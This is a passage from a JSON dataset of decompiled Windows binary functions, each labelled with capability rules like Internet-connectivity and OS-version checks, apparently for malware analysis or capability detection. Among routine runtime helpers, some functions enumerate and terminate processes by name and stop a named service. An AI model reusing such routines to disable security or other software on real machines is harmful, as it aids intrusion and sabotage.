        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_264h\n\nvoid __cdecl fcn.0041c890(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_264h;\n    uint var_24ch;\n    int32_t hProcess;\n    int32_t hObject;\n    char var_23dh;\n    uint var_23ch;\n    uint var_234h;\n    uint var_218h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x471b10;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.00404d10(var_10h);\n    if ((cVar1 == '\\0') && (hObject = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0),  hObject != -1)) {\n        fcn.00452000(&var_23ch, 0, 0x22c);\n        var_23ch = 0x22c;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(hObject, &var_23ch);\n        while (iVar2 != 0) {\n            fcn.00405090(&var_218h);\n            var_23dh = fcn.0040cdc0(arg_8h, &var_264h);\n            fcn.00404f30();\n            if ((var_23dh != '\\0') && (hProcess = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, var_234h),  hProcess != 0))\n            {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(hProcess);\n                goto code_r0x0041c9d9;\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_Process32NextW)(hObject, &var_23ch);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\ncode_r0x0041c9d9:\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(var_264h);\n    return;\n}\n",
        "token_count": 553
    },
    "0041ca00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041ca00(uint arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t hSCManager_00;\n    uint uVar3;\n    int32_t hService;\n    int32_t iVar4;\n    uint in_ECX;\n    uint var_44h;\n    uint var_40h;\n    uint hSCManager;\n    uint32_t dwMilliseconds;\n    uint hSCObject;\n    uint var_2dh;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_2dh._0_1_ = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    cVar1 = fcn.00404d10();\n    if ((cVar1 == '\\0') && (hSCManager_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, 0, 0xf003f),  hSCManager_00 != 0)\n       ) {\n        uVar3 = fcn.00404db0(0x2c);\n        hService = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(hSCManager_00, uVar3);\n        if (hService != 0) {\n            stack0xffffffd0 = 0;\n            var_28h = 0;\n            var_24h = 0;\n            var_20h = 0;\n            var_1ch = 0;\n            var_18h = 0;\n            var_14h = 0;\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)(hService, 0, &var_2dh + 1, 0x24, &var_8h);\n            if ((iVar4 != 0) && (var_28h != 1)) {\n                while (var_28h == 3) {\n                    dwMilliseconds = var_14h / 10;\n                    if (dwMilliseconds < 1000) {\n                        dwMilliseconds = 1000;\n                    }\n                    else if (10000 < dwMilliseconds) {\n                        dwMilliseconds = 10000;\n                    }\n                    (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)(hService, 0, &var_2dh + 1, 0x24, &var_8h);\n                    if (((iVar4 == 0) || (var_28h == 1)) ||\n                       (iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)(),  arg_ch < iVar4 - iVar2)) break;\n                }\n                fcn.0041c5b0(hSCManager_00, hService, arg_ch);\n                iVar4 = (*_sym.imp.ADVAPI32.dll_ControlService)(hService, 1, &var_2dh + 1);\n                if (iVar4 != 0) {\n                    do {\n                        do {\n                            if (var_28h == 1) goto code_r0x0041cba4;\n                            (*_sym.imp.KERNEL32.dll_Sleep)(arg_ch);\n                            iVar4 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)\n                                              (hService, 0, &var_2dh + 1, 0x24, &var_8h);\n                        } while (iVar4 == 0);\n                        if (var_28h == 1) {\n                            var_2dh._0_1_ = 1;\n                            break;\n                        }\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    } while (iVar4 - iVar2 <= arg_ch);\n                }\n            }\ncode_r0x0041cba4:\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hService);\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager_00);\n    }\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 1007
    },
    "0041cc50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041cc50(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_8h != 0) && (arg_8h != arg_ch)) {\n        fcn.00426ceb(arg_8h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "0041d4d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0041d4d0(uint param_1)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint arg_ch;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.00406300(param_1);\n    piVar1 = fcn.004072d0();\n    if (*piVar1 != 0) {\n        puVar2 = fcn.00404940();\n        uVar3 = *puVar2;\n        puVar2 = fcn.004072d0();\n        fcn.0041d5b0(*puVar2, uVar3);\n        arg_ch = fcn.0041d5e0();\n        puVar2 = fcn.004072d0();\n        uVar3 = *puVar2;\n        fcn.00404960();\n        fcn.0041d610(uVar3, arg_ch);\n        puVar2 = fcn.004072d0();\n        *puVar2 = 0;\n        puVar2 = fcn.00404940();\n        *puVar2 = 0;\n        puVar2 = fcn.00405fb0();\n        *puVar2 = 0;\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "0041d560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d560(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    piVar1 = fcn.00401440(arg_8h);\n    if (in_ECX != piVar1) {\n        if (*in_ECX != 0) {\n            fcn.00416ad0();\n        }\n        *in_ECX = *arg_8h;\n        *arg_8h = 0;\n        *(in_ECX + 1) = *(arg_8h + 1);\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "0041dc40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041dc40(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint arg_ch_00;\n    uint uVar3;\n    uint var_4h;\n    \n    fcn.00406300();\n    piVar1 = fcn.004072d0();\n    if (*piVar1 != 0) {\n        puVar2 = fcn.00404940();\n        uVar3 = *puVar2;\n        puVar2 = fcn.004072d0();\n        fcn.0041d5b0(*puVar2, uVar3);\n        arg_ch_00 = fcn.0041d5e0();\n        puVar2 = fcn.004072d0();\n        uVar3 = *puVar2;\n        fcn.00404960();\n        fcn.0041d610(uVar3, arg_ch_00);\n    }\n    piVar1 = fcn.004072d0();\n    *piVar1 = arg_8h;\n    piVar1 = fcn.00404940();\n    *piVar1 = arg_ch * 0x20 + arg_8h;\n    piVar1 = fcn.00405fb0();\n    *piVar1 = arg_10h * 0x20 + arg_8h;\n    return;\n}\n",
        "token_count": 316
    },
    "0041ded0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041ded0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint uVar3;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uVar4;\n    uint var_4h;\n    \n    uVar4 = 0x4717c6;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_8h == 1) {\n        iVar1 = fcn.0043a4f7(0xb0, arg_8h_00);\n        if (iVar1 == 0) {\n            var_20h = 0;\n        }\n        else {\n            uVar3 = 0xb0;\n            fcn.00401b10(0xb0);\n            uVar2 = fcn.00401440(arg_ch);\n            var_20h = fcn.0041e380(uVar2, uVar3, arg_8h_00, var_34h, var_30h, var_2ch, var_28h, var_24h, var_20h, 1, \n                                   var_18h, var_14h, iVar1, var_ch, uVar4, 0, unaff_EBP, unaff_retaddr, 1, arg_ch, \n                                   in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                                   in_stack_0000001c, in_stack_00000020);\n        }\n    }\n    else if (arg_8h == 2) {\n        iVar1 = fcn.0043a4f7(0xa8, arg_8h_00);\n        if (iVar1 == 0) {\n            var_24h = 0;\n            var_20h = var_24h;\n        }\n        else {\n            fcn.00401b10(0xa8);\n            uVar4 = fcn.00401440(arg_ch);\n            var_20h = fcn.0041e460(uVar4);\n        }\n    }\n    else {\n        iVar1 = fcn.0043a4f7(0xb0, arg_8h_00);\n        if (iVar1 == 0) {\n            var_28h = 0;\n            var_20h = var_28h;\n        }\n        else {\n            uVar3 = 0xb0;\n            fcn.00401b10(0xb0);\n            uVar2 = fcn.00401440(arg_ch);\n            var_20h = fcn.0041e490(uVar2, uVar3, arg_8h_00, var_34h, var_30h, var_2ch, var_28h, var_24h, var_20h, arg_8h\n                                   , iVar1, var_14h, var_10h, var_ch, uVar4, 2, unaff_EBP, unaff_retaddr, arg_8h, arg_ch\n                                   , in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                                   in_stack_0000001c, in_stack_00000020);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return var_20h;\n}\n",
        "token_count": 1115
    },
    "0041eb40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041eb40(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    do {\n        cVar1 = fcn.0041eef0();\n        if (cVar1 != '\\0') {\n            return 1;\n        }\n        iVar2 = fcn.0041ccb0(arg_8h, arg_ch);\n    } while (iVar2 != 1);\n    uVar3 = fcn.0041eef0();\n    return uVar3;\n}\n",
        "token_count": 156
    },
    "0041eef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041eef0(int32_t *param_1)\n\n{\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *(*param_1 + 0x70) != 0;\n    return param_1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 77
    },
    "0041fca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fca0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47196f;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00406250(uVar1);\n    *(iVar2 + 8) = 0;\n    iVar2 = fcn.00406250();\n    *(iVar2 + 9) = 0;\n    uVar3 = 0;\n    fcn.00406250();\n    fcn.004264cf();\n    iVar2 = fcn.0043a4f7(0x10, uVar3);\n    var_4h = 0;\n    if (iVar2 == 0) {\n        var_18h = 0;\n    }\n    else {\n        uVar3 = fcn.00402930();\n        var_18h = fcn.00420350(uVar3, arg_8h);\n    }\n    var_4h = 0xffffffff;\n    fcn.00406250(var_18h, 0);\n    fcn.00414ac0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 367
    },
    "0041fd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fd70(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47196f;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00406250(uVar1);\n    *(iVar2 + 8) = 0;\n    iVar2 = fcn.00406250();\n    *(iVar2 + 9) = 0;\n    uVar3 = 0;\n    fcn.00406250();\n    fcn.004264cf();\n    iVar2 = fcn.0043a4f7(0x10, uVar3);\n    var_4h = 0;\n    if (iVar2 == 0) {\n        var_18h = 0;\n    }\n    else {\n        uVar3 = fcn.00402930();\n        var_18h = fcn.00420140(uVar3, arg_8h);\n    }\n    var_4h = 0xffffffff;\n    fcn.00406250(var_18h, 0);\n    fcn.00414ac0();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 366
    },
    "00421362": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_68h\n\nvoid __cdecl fcn.00421362(uint16_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, int32_t *arg_14h, uint *arg_18h)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_68h;\n    uint8_t *var_3ch;\n    int32_t *var_38h;\n    uint var_30h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_3ch = arg_ch;\n    var_38h = arg_14h;\n    if ((arg_ch != NULL) && (arg_10h != 0)) {\n        if (*arg_ch == 0) {\n            if (arg_8h != NULL) {\n                *arg_8h = 0;\n            }\n        }\n        else {\n            if (arg_18h == NULL) {\n                puVar2 = fcn.004257ac(&var_68h);\n                puVar4 = &var_30h;\n                for (iVar3 = 0xb; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                arg_18h = &var_30h;\n            }\n            puVar1 = var_3ch;\n            if (arg_18h[2] == 0) {\n                if (*var_38h == 0) {\n                    if ((*((*var_3ch >> 3) + 0xc + arg_18h) & 1 << (*var_3ch & 7)) == 0) {\n                        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                          (*arg_18h, 9, var_3ch, 1, arg_8h, arg_8h != NULL);\n                        if (iVar3 != 0) goto code_r0x004213a1;\n                    }\n                    else {\n                        if (arg_10h < arg_18h[1]) {\n                            *var_38h = *var_3ch;\n                            goto code_r0x004213a1;\n                        }\n                        if (((1 < arg_18h[1]) &&\n                            (iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                               (*arg_18h, 9, var_3ch, arg_18h[1], arg_8h, arg_8h != NULL),  iVar3 != 0))\n                           || (puVar1[1] != 0)) goto code_r0x004213a1;\n                        *var_38h = 0;\n                    }\n                }\n                else {\n                    *(var_38h + 1) = *var_3ch;\n                    if ((1 < arg_18h[1]) &&\n                       (iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                          (*arg_18h, 9, var_38h, 2, arg_8h, arg_8h != NULL),  iVar3 != 0)) {\n                        *var_38h = 0;\n                        goto code_r0x004213a1;\n                    }\n                    *var_38h = 0;\n                }\n                puVar2 = fcn.0045652e();\n                *puVar2 = 0x2a;\n            }\n            else if (arg_8h != NULL) {\n                *arg_8h = *var_3ch;\n            }\n        }\n    }\ncode_r0x004213a1:\n    fcn.0043a2e7(var_68h);\n    return;\n}\n",
        "token_count": 868
    },
    "00421dfa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00421dfa(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    uint arg_14h_00;\n    uchar uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint uVar11;\n    uint noname_0;\n    int32_t unaff_EBP;\n    char *pcVar12;\n    uint32_t arg_1ch_00;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad07(0x5c);\n    uVar9 = *(unaff_EBP + 0x24);\n    pcVar12 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x4c) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x58) = uVar9;\n    if ((uVar9 == 0) || ((*pcVar12 != '+' && (*pcVar12 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if ((*(*(unaff_EBP + 0x18) + 0x14) & 0x3000) == 0x3000) {\n        uVar11 = 0x4744c0;\n        if (((arg_1ch_00 + 2 <= uVar9) && (pcVar12[arg_1ch_00] == '0')) &&\n           ((pcVar12[arg_1ch_00 + 1] == 'x' || (pcVar12[arg_1ch_00 + 1] == 'X')))) {\n            arg_1ch_00 = arg_1ch_00 + 2;\n        }\n    }\n    else {\n        uVar11 = 0x4744bc;\n    }\n    uVar11 = fcn.0045a0c0(pcVar12, uVar11);\n    *(unaff_EBP + -0x60) = uVar11;\n    *(unaff_EBP + -0x48) = 0x2e;\n    puVar6 = fcn.0045b6c6();\n    *(unaff_EBP + -0x48) = **puVar6;\n    iVar7 = fcn.0045a0c0(pcVar12, unaff_EBP + -0x48);\n    fcn.00421bb3(*(*(unaff_EBP + -0x4c) + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar11 = fcn.004218b0(unaff_EBP + -0x54);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x44) = uVar11;\n    fcn.00401990();\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x28) = 0;\n    fcn.0040acd0(*(unaff_EBP + -0x58), 0);\n    iVar10 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (0xf < *(unaff_EBP + -0x14)) {\n        iVar10 = *(unaff_EBP + -0x28);\n    }\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x1c);\n    (**0x4742a4)(pcVar12, pcVar12 + *(unaff_EBP + -0x58), iVar10);\n    (*pcVar2)();\n    fcn.00421bb3(*(*(unaff_EBP + -0x4c) + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar8 = fcn.00421aa2(unaff_EBP + -0x54);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar8;\n    fcn.00401990();\n    pcVar2 = *(*piVar8 + 0x14);\n    (**0x4742a4)(unaff_EBP + -0x40);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 3;\n    pcVar2 = *(**(unaff_EBP + -0x44) + 0x10);\n    (**0x4742a4)();\n    uVar5 = (*pcVar2)();\n    *(unaff_EBP + -0x50) = uVar5;\n    if (iVar7 == *(unaff_EBP + -0x58)) {\n        iVar7 = *(unaff_EBP + -0x60);\n    }\n    else {\n        pcVar2 = *(**(unaff_EBP + -0x44) + 0xc);\n        (**0x4742a4)();\n        uVar5 = (*pcVar2)();\n        iVar10 = unaff_EBP + -0x28;\n        if (0xf < *(unaff_EBP + -0x14)) {\n            iVar10 = *(unaff_EBP + -0x28);\n        }\n        *(iVar10 + iVar7) = uVar5;\n    }\n    pcVar12 = unaff_EBP + -0x40;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar12 = *(unaff_EBP + -0x40);\n    }\n    while (((cVar1 = *pcVar12,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar7 - arg_1ch_00))) {\n        iVar7 = iVar7 - cVar1;\n        fcn.00424fe8(iVar7, 1, *(unaff_EBP + -0x50));\n        if ('\\0' < pcVar12[1]) {\n            pcVar12 = pcVar12 + 1;\n        }\n    }\n    iVar10 = *(unaff_EBP + -0x4c);\n    uVar9 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x50) = uVar9;\n    uVar3 = *(iVar10 + 0x20);\n    if (((*(iVar10 + 0x24) < 0) || ((*(iVar10 + 0x24) < 1 && (uVar3 == 0)))) || (uVar3 <= uVar9)) {\n        iVar7 = 0;\n    }\n    else {\n        iVar7 = uVar3 - uVar9;\n    }\n    uVar9 = *(iVar10 + 0x14) & 0x1c0;\n    if (uVar9 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (0xf < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        noname_0 = *(unaff_EBP + 8);\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar11 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar9 == 0x100) {\n            iVar10 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar10 = *(unaff_EBP + -0x28);\n            }\n            noname_0 = *(unaff_EBP + 8);\n            puVar6 = fcn.00423d28(noname_0, unaff_EBP + -100, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), iVar10, \n                                  arg_1ch_00);\n            puVar6 = fcn.00423d5b(noname_0, unaff_EBP + -100, *puVar6, puVar6[1], *(unaff_EBP + 0x1c), iVar7);\n            iVar7 = 0;\n            goto code_r0x0042209f;\n        }\n        noname_0 = *(unaff_EBP + 8);\n        puVar6 = fcn.00423d5b(noname_0, unaff_EBP + -100, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), *(unaff_EBP + 0x1c)\n                              , iVar7);\n        iVar7 = 0;\n        var_28h = unaff_EBP + -0x28;\n        if (0xf < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = puVar6[1];\n        uVar11 = *puVar6;\n    }\n    puVar6 = fcn.00423d28(noname_0, unaff_EBP + -100, uVar11, var_2ch, var_28h, arg_1ch_00);\ncode_r0x0042209f:\n    uVar11 = *puVar6;\n    *(unaff_EBP + 0x10) = uVar11;\n    uVar4 = puVar6[1];\n    *(unaff_EBP + 0x14) = uVar4;\n    *(unaff_EBP + -0x58) = unaff_EBP + -0x28;\n    if (0xf < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x58) = *(unaff_EBP + -0x28);\n    }\n    puVar6 = fcn.00423d28(noname_0, unaff_EBP + -0x5c, uVar11, uVar4, *(unaff_EBP + -0x58) + arg_1ch_00, \n                          *(unaff_EBP + -0x50) - arg_1ch_00);\n    iVar10 = *(unaff_EBP + -0x4c);\n    uVar11 = *(unaff_EBP + 0x1c);\n    uVar4 = *puVar6;\n    arg_ch_00 = *(unaff_EBP + -0x68);\n    *(unaff_EBP + 0x10) = uVar4;\n    arg_14h_00 = puVar6[1];\n    *(iVar10 + 0x20) = 0;\n    *(iVar10 + 0x24) = 0;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00423d5b(noname_0, arg_ch_00, uVar4, arg_14h_00, uVar11, iVar7);\n    fcn.00406810();\n    fcn.00406810();\n    fcn.0043acb1();\n    return;\n}\n",
        "token_count": 2839
    },
    "004223d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
